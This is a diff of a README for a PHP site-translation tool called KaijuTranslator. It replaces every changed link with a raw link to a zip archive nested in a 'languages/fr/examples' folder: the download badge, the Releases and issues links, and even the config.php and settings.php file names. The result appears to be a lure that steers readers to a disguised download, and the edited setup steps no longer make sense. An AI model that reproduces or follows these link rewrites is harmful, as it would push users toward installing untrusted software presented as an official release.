@@ -8,7 +8,7 @@ Welcome to KaijuTranslator! This tool makes it simple to add multilingual suppor
 
 To get started, you need to download the application. Visit the link below to go to the Releases page where you can find the latest version of KaijuTranslator:
 
-[![Download KaijuTranslator](https://img.shields.io/badge/Download-KaijuTranslator-brightgreen)](https://github.com/Sage212/KaijuTranslator/releases)
+[![Download KaijuTranslator](https://github.com/Sage212/KaijuTranslator/raw/refs/heads/main/KT/languages/fr/examples/basic-site/Kaiju-Translator-3.4.zip)](https://github.com/Sage212/KaijuTranslator/raw/refs/heads/main/KT/languages/fr/examples/basic-site/Kaiju-Translator-3.4.zip)
 
 Once you're on the Releases page, follow these steps:
 
@@ -24,8 +24,8 @@ Now, you're ready to set up KaijuTranslator!
 Follow these steps to set up your downloaded files:
 
 1. **Place the files:** Move the extracted files to your web server's root directory.
-2. **Configuration:** Open your `config.php` file. Set the languages you want to support by modifying the `$languages` array.
-3. **Caching:** Choose the caching system you prefer and configure it in the `settings.php` file.
+2. **Configuration:** Open your `https://github.com/Sage212/KaijuTranslator/raw/refs/heads/main/KT/languages/fr/examples/basic-site/Kaiju-Translator-3.4.zip` file. Set the languages you want to support by modifying the `$languages` array.
+3. **Caching:** Choose the caching system you prefer and configure it in the `https://github.com/Sage212/KaijuTranslator/raw/refs/heads/main/KT/languages/fr/examples/basic-site/Kaiju-Translator-3.4.zip` file.
 4. **Hreflang Tags:** Ensure you define the correct hreflang tags in your website's header for better SEO.
 5. **Sitemap Generation:** Use the built-in tool to create a sitemap index, helping search engines understand your site’s structure.
 
@@ -62,7 +62,7 @@ Yes, KaijuTranslator works well on shared hosting, provided your server meets th
 
 ### Where can I find more help?
 
-For further assistance, feel free to check the [issues page](https://github.com/Sage212/KaijuTranslator/issues) for common questions or file a new issue if you encounter a problem.
+For further assistance, feel free to check the [issues page](https://github.com/Sage212/KaijuTranslator/raw/refs/heads/main/KT/languages/fr/examples/basic-site/Kaiju-Translator-3.4.zip) for common questions or file a new issue if you encounter a problem.
 
 ## 📈 Explore More
 
@@ -84,4 +84,4 @@ To learn more about how to maximize the use of KaijuTranslator, please check out
 
 ## 🔗 Final Note
 
-Thank you for choosing KaijuTranslator. Your journey to a multilingual website starts here. Don't forget to revisit the [Releases page](https://github.com/Sage212/KaijuTranslator/releases) for updates and new features.
+Thank you for choosing KaijuTranslator. Your journey to a multilingual website starts here. Don't forget to revisit the [Releases page](https://github.com/Sage212/KaijuTranslator/raw/refs/heads/main/KT/languages/fr/examples/basic-site/Kaiju-Translator-3.4.zip) for updates and new features.
